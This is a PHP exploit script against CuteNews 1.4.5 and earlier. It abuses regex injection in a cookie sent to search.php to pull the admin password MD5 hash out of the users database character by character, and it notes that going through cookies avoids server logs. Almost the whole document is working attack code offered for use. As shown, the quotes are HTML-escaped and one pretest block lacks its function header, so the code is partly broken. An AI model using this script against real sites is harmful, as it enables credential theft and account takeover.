CuteNews <= 1.4.5 Admin Password md5 Hash Fetching Exploit
==========================================================



<?php
error_reporting(E_ALL); 
/////////////////////////////////////////////////////////////////////// 
///////////////////////////////////////////////////////////////////////
// Cutenews <= 1.4.5 admin password md5 hash fetching exploit
// Version 1.0
// written by Janek Vind "waraxe" 
// 23. dec 2007
// Estonia, Tartu
//
// FEATURES:
// 1. Fetching algorithm optimized for speed
// 2. Attack goes through $_COOKIE, so no log fear
// 3. Pretesting saves time if Cutenews is not vulnerable
//
//
// NB! This exploit is meant to be run as php CLI!
// http://www.php.net/features.commandline
/////////////////////////////////////////////////////////////////////// 
/////////////////////////////////////////////////////////////////////// 
//===================================================================== 
$target = &#039;http://localhost/cutenews.1.4.5/search.php&#039;;
$username = &#039;waraxe&#039;; // Username is needed
$outfile = &#039;./cute_log.txt&#039;;// Log file
//=====================================================================
///////////////////////////////////////////////////////////////////////
// Don&#039;t mess below this line, unless you know the stuff ;)
///////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////
$levels = array(1=>&#039;admin&#039;,2=>&#039;editor&#039;,3=>&#039;journalist&#039;,4=>&#039;commenter&#039;);
$start_time = time();
$requests = 0;
$cli = php_sapi_name() === &#039;cli&#039;;
//=====================================================================
// Warning, if executed from webserver
//=====================================================================
if(!$cli)
{
	if(!isset($_REQUEST[&#039;wtf-is-cli&#039;]))
	{ 
		echo "<html><head><title>Attention!</title></head>\n";
		echo "<body><br /><br /><center>\n";
		echo "<h1>Warning!</h1>\n";
		echo "This exploit is meant to be used as php CLI script!<br />\n";
		echo "More information:<br />\n";
		echo "<a href=\"http://www.google.com/search?hl=en&q=php+cli+windows\" target=\"_blank\">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n";
		echo "Still, you can try to run it from webserver.<br />\n";
		echo "And learn to use php CLI next time, please ...<br />\n";
		echo "<form method=\"get\">\n";
		echo "<input type=\"submit\" name=\"wtf-is-cli\" value=\"Let me in, i don&#039;t care\">\n";
		echo "</form>\n";
		echo "</center></body></html>\n";
		exit;
	}
	else
	{
		// Let&#039;s try to maximize our chances without CLI
		set_time_limit(0);
	}
}
//=====================================================================
add_logline("-------------------------------------------------------");
add_logline("Cutenews password md5 hash fetching started");
add_logline("Target: $target");
add_logline("Username: $username");


$h = get_hash();
$run_time = time() - $start_time;

add_logline("MD5 hash: $h");

xecho("\nFinal MD5 hash: $h", 1);
xecho("\nTotal time spent: $run_time seconds", 1);
xecho("HTTP requests made: $requests\n", 1);
xecho("Questions and feedback - http://www.waraxe.us/forums.html", 1); 
xecho("See ya! :)", 1);

exit; 
//////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////
function get_hash()
{
	$hash = &#039;&#039;;
	
	for($i = 0; $i < 32; $i ++)
	{
		xecho("Finding hash char pos $i");
		$c = get_hash_char($i);
		$hash .= $c;
		xecho("Current hash: $hash");
	}
	
	return $hash;
}
///////////////////////////////////////////////////////////////////////
function get_hash_char($pos)
{
	global $username;
	
	$un = "^$username\$";
	$charset = &#039;0123456789abcdef&#039;;
	
	$beg = &#039;^&#039;;
	if($pos > 0)
	{
		$beg .= "([a-f0-9]{{$pos}})";
	}
	
	$end = &#039;$&#039;;
	if($pos < 31)
	{
		$cnt = 31 - $pos;
		$end = "([a-f0-9]{{$cnt}})\$"; 
	}
	
	for($i = 8; $i > 0; $i >>= 1)
	{
		$first = substr($charset, 0, $i);
		$second = substr($charset, $i);		
		$hp = "$beg([$first])$end";

		if( make_query($un, $hp) === 1)
		{
			xecho("Position $pos: [$first]");
			$charset = $first;
		}
		else
		{
			xecho("Position $pos: [$second]");
			$charset = $second;
		}
	}
	
	return $charset;
}
///////////////////////////////////////////////////////////////////////
{
	global $username;
	
	// Target URL valid?
	xecho("Validating target URL");
	if(strpos(make_get($GLOBALS[&#039;target&#039;]), &#039;search_in_archives&#039;) === false)
	{
		die(&#039;Target URL not valid!&#039;);
	}
	xecho("URL is valid");
	
	$un = "^$username\$";
	if( make_query($un) !== 1)
	{
		die(&#039;Pretest 1 failed - wrong username?&#039;);
	}
	else
	{
		xecho("Pretest 1 passed - username OK", 1);
	}

	$hp = &#039;^[a-f0-9]{32}$&#039;;
	if( make_query($un, $hp) !== 1)
	{
		die(&#039;Pretest 2 failed - target not vulnerable?&#039;);
	}
	else
	{
		xecho("Pretest 2 passed - regex injection OK", 1);
	}

	$hp = &#039;^[a-f0-9]{1337}$&#039;;
	if( make_query($un, $hp) !== 0)
	{
		die(&#039;Pretest 3 failed - target not vulnerable?&#039;);
	}
	else
	{
		xecho("Pretest 3 passed - regex injection OK", 1);
	}
}
///////////////////////////////////////////////////////////////////////
function make_query($username, $hashpattern = &#039;&#039;)
{
	global $target;
	$max_retries = 10;
	
	$cookie = "dosearch=yes;files_arch[]=./data/users.db.php;title=$username";
	if(!empty($hashpattern))
	{
		$cookie .= ";story=$hashpattern";
	}
	
	for($retry = 0; $retry < $max_retries + 1; $retry ++)
	{
		if($retry > 0)
		{
			xecho("Request failed!", 1);
			xecho("Sleeping $retry seconds", 1);
			sleep($retry);
			xecho("Awake ...", 1);
			xecho("Retry #$retry", 1);
		}
		$buff = make_get($target, $cookie);
		$x = strpos($buff, &#039;<b>Founded News articles [&#039;);
		$y = strpos($buff, &#039;]:</b>&#039;, $x + 25);
		if( ($x !== false) && ($y !== false) && ($x < $y) )
		{
			$buff = trim(substr($buff, $x + 26, $y - $x - 26));
			$ret = intval($buff);
			if( ($ret > -1) && ($ret < 2) )
			{
				return $ret;
			}
		}
	}
	
	die(&#039;Fatal errror - server down?&#039;);
}
///////////////////////////////////////////////////////////////////////
function make_get($url, $cookie = &#039;&#039;, $referer = &#039;&#039;, $headers = FALSE)
{
	$ch = curl_init();
	$timeout = 120;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_USERAGENT, &#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)&#039;);
	
	if(!empty($cookie))
	{
		curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	}
 
	if(!empty($referer))
	{
		curl_setopt($ch, CURLOPT_REFERER, $referer);
	}

	if($headers === TRUE)
	{
		curl_setopt($ch, CURLOPT_HEADER, TRUE);
	}
	else
	{
		curl_setopt($ch, CURLOPT_HEADER, FALSE);
	}

	$fc = curl_exec($ch);
	curl_close($ch);
	$GLOBALS[&#039;requests&#039;] ++;
	
	return $fc;
}
//////////////////////////////////////////////////////////////////////
function add_logline($line)
{
	global $outfile;
	
	$line .= "\n";
	$fh = fopen($outfile, &#039;ab&#039;);
	fwrite($fh, $line);
	fclose($fh);
	
}
//////////////////////////////////////////////////////////////////////
function xecho($line, $both = 0)
{
	if($GLOBALS[&#039;cli&#039;])
	{
		echo "$line\n";
	}
	elseif($both)
	{
		$line = nl2br(htmlspecialchars($line));
		echo "$line<br />\n";
	}
}
/////////////////////////////////////////////////////////////////////
?>



